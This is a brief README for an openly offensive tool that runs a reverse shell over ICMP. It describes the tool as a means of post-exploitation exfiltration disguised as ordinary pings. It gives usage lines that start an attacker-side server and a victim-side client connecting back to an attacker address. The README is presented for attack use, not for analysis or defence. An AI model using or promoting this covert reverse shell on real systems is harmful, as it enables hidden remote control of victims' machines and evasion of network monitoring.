# ICMPReverseShell

Reverse shell over icmp, this could be used as part of post-exploitation exfihiltration, to mask traffic as simple pings.


# Usage
attacker: sudo python3 server.py -i <interface> -d <victim address>

victim: sudo python3 client.py -i <interface> -d <attacker address>
